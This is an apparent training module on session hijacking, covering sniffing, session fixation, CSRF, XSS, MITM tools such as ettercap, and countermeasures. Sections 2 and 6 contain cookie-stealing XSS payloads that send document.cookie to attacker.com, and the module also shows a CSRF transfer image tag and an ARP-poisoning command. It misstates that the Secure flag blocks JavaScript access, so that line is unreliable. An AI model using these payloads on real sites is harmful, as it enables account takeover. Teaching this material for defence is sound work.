Module 11: Session Hijacking

Section 1: Session Fundamentals

HTTP is a stateless protocol - each request is independent. Sessions maintain state between requests to track user activity.

Session Mechanisms

  • Cookies: Small data stored in browser, sent with each request to identify the session
  • URL rewriting: Session ID embedded in URL (less common, less secure)
  • Hidden form fields: Session ID stored in hidden input fields
  • SSL session IDs: Established during TLS handshake

Common Session Cookies

  • JSESSIONID: Java servlet API sessions
  • PHPSESSID: PHP session identifier
  • ASP.NET_SessionId: ASP.NET session state
  • SESSION: Generic session cookie

Section 2: Session Hijacking Techniques

What is Session Hijacking?

Taking over a user's authenticated session by stealing or predicting the session ID. The attacker uses the victim's valid session to access the application without authentication.

Network Sniffing

Capturing unencrypted session cookies transmitted over the network. Works on unsecured Wi-Fi, switched networks (via ARP poisoning), or any network where the attacker has access to traffic.

Mitigation: Use HTTPS for all sessions, implement HSTS headers

Predicting Session IDs

If session IDs are generated using predictable algorithms (sequential numbers, time-based), attacker can guess valid session IDs.

  • Weak random number generators: Predictable output
  • Sequential IDs: Easy to iterate through
  • Information leakage: Session IDs revealed in logs, URLs, referrer headers

Cookie Poisoning

Modifying session cookie values to gain unauthorized access. E.g., changing role=guest to role=admin.

Session Fixation

Attacker sets a known session ID for the victim, then waits for the victim to authenticate using that session ID.

  1. Attacker obtains a valid session ID from the application
  2. Attacker tricks victim into using that session ID (via URL, phishing)
  3. Victim authenticates with the fixed session ID
  4. Attacker uses the known session ID to access the authenticated session

XSS for Session Hijacking

Cross-Site Scripting allows stealing session cookies via JavaScript:

var img = document.createElement('img');
img.src = 'http://attacker.com/steal?c=' + document.cookie;
document.body.appendChild(img);

CSRF (Cross-Site Request Forgery)

Tricking an authenticated user into performing unintended actions. The attacker exploits the fact that the user's browser automatically includes session cookies with requests.

Example

<img src="http://bank.com/transfer?to=hacker&amount=10000">

When the victim loads a page containing this image, their browser sends the request with their session cookies.

Man-in-the-Middle (MITM)

Positioning between victim and server to capture/modify session data. Can be done via ARP poisoning, DNS spoofing, rogue AP, or SSL stripping.

Section 3: Session Hijacking Tools

Wireshark

Capture and analyze network traffic to find unencrypted session cookies.

Follow TCP Stream -> Filter for "Set-Cookie"

Tamper Data (Firefox Extension)

View and modify HTTP/HTTPS headers including cookies before they are sent to the server.

Cookie Monster (Firefox Extension)

View, edit, and delete cookies stored by the browser.

BeEF (Browser Exploitation Framework)

Exploits web browsers using XSS to gain control over the victim's browser and steal session cookies.

Ettercap

MITM attacks on local network to capture session data. Supports ARP poisoning for switched networks.

ettercap -T -q -i eth0 -M arp:remote // //

Cain & Abel

Windows tool that can sniff session cookies on LAN, recover password hashes, and perform ARP poisoning.

Section 4: Session Hijacking Countermeasures

Transport Layer Security

  • HTTPS everywhere: Encrypt all session data in transit
  • HSTS (HTTP Strict Transport Security): Force browsers to use HTTPS only
  • SSL pinning: In mobile apps, validate specific SSL certificates

Session Management Best Practices

  • Use strong random session IDs: At least 128 bits of entropy
  • Secure flag on cookies: Prevents JavaScript access (prevents XSS theft)
  • HttpOnly flag: Cookies not accessible via client-side scripts
  • Samesite attribute: Prevents CSRF by restricting cross-site requests
  • Short session timeouts: Limit session lifetime
  • Session regeneration: Generate new session ID after login (prevents fixation)

Application-Level Defenses

  • CSRF tokens: Unique token per session included in forms
  • Input validation: Sanitize all user input to prevent XSS
  • Content Security Policy (CSP): Prevent inline scripts
  • Multi-factor authentication: Reduces impact of session theft

Network-Level Defenses

  • Switched networks: Use switches instead of hubs
  • ARP inspection (DAI): Prevent ARP poisoning
  • Encrypted traffic analysis: Detect unusual patterns

Section 5: CSRF Deep Dive

CSRF Attack Flow

  1. Victim authenticates to target site (session cookie set)
  2. Victim visits attacker's malicious page while still authenticated
  3. Malicious page sends request to target site with victim's cookies
  4. Target site processes the request as legitimate

CSRF Protection Methods

  • Anti-CSRF tokens: Unique token per session, validated on each state-changing request
  • SameSite cookies: Browser prevents sending cookies in cross-site requests
  • Referer header checking: Verify request origin
  • User agent verification: Check for consistent user agents
  • Double-submit cookies: Cookie value must match custom header value

Types of CSRF

  • GET-based CSRF: Manipulating state via URL parameters (less common, should not change state)
  • POST-based CSRF: Submitting forms via POST requests
  • HTTPS CSRF: Works even on encrypted sites if cookies are sent

Section 6: XSS and Session Hijacking

Stored XSS

Malicious script stored on the target server (e.g., in a database). Executed when victims view the content.

Reflected XSS

Malicious script embedded in URL. Victim must click the link for it to execute.

DOM-Based XSS

Vulnerability in client-side JavaScript that processes data from an untrusted source without proper sanitization.

Stealing Cookies via XSS

// Steal cookies and send to attacker
document.location = 'http://attacker.com/steal?c=' + document.cookie;

// Send to server using fetch
fetch('http://attacker.com/steal?c=' + document.cookie);

XSS Countermeasures

  • Output encoding: Encode all user-supplied data before rendering
  • Input validation: Reject or sanitize dangerous input
  • CSP headers: Prevent inline script execution
  • HttpOnly cookies: Make session cookies inaccessible to JavaScript
